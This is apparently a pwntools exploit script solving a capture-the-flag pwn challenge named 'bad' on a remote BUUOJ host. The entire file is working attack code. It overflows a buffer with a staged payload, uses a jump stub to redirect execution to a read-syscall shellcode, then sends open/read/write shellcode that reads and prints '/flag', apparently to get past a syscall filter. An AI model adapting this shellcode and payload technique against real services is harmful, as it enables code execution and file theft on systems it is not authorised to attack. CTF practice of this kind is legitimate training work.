from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

# io = process('./bad')
io = remote('node4.buuoj.cn', 28044)
elf = ELF('./bad')

poprdi_ret = 0x400b13

shellcode_1 = '\
	.1:\
	nop; nop; nop; nop; nop; nop; nop; nop; nop; nop; nop; nop; nop; nop; nop; nop; \
	nop; nop; nop; nop; nop; nop; nop; nop; nop; nop; nop; nop; nop; nop; nop; nop; \
	nop; nop; nop; nop; nop; nop; nop; nop; \
	jmp .1\
'

jmp_inst = asm(shellcode_1)[0x28:]

shellcode_2 = '\
	mov rsi, rsp;\
	sub rsi, 0x10;\
	xor rax, rax;\
	xor rdi, rdi;\
	mov rdx, 0x100;\
	syscall;\
'

sc1 = asm(shellcode_2).ljust(0x18, b'\x90')

payload = sc1 + p64(0)
payload += jmp_inst.ljust(8, b'\x90')	# change rbp
payload += p64(0x4009EE)

io.sendafter(b'Easy shellcode, have fun!\n', payload.ljust(0x38, b'\x00'))

data_seg = 0x601058

shellcode3 = '\
	xor rax, rax;\
	xor rdi, rdi;\
	mov rsi, 0x601058;\
	mov rdx, 6;\
	syscall;\
	mov rax, 2;\
	mov rdi, 0x601058;\
	xor rsi, rsi;\
	xor rdx, rdx;\
	syscall;\
	mov rdi, rax;\
	xor rax, rax;\
	mov rsi, rsp;\
	sub rsi, 0x40;\
	mov rdx, 0x30;\
	syscall;\
	mov rax, 1;\
	mov rdi, rax;\
	mov rsi, rsp;\
	sub rsi, 0x40;\
	mov rdx, 0x30;\
	syscall;\
'

io.send(asm(shellcode3).ljust(0x100, b'\x00'))
io.send(b'/flag\x00')


io.interactive()
